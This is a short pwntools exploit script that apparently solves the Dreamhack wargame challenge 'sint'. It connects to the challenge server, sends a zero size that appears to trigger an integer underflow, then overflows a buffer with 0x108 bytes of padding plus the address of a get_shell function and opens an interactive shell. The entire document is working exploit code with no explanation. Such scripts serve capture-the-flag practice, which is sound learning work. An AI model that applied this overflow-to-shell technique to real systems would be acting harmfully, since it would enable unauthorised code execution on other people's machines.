from pwn import *

port = 18937
rem = remote("host3.dreamhack.games", port)

elf = ELF("./sint/problem/sint")

rem.sendlineafter(b'Size: ', b'0')
rem.sendlineafter(b'Data: ', b'A' * 0x108 + p32(elf.symbols['get_shell']))

rem.interactive()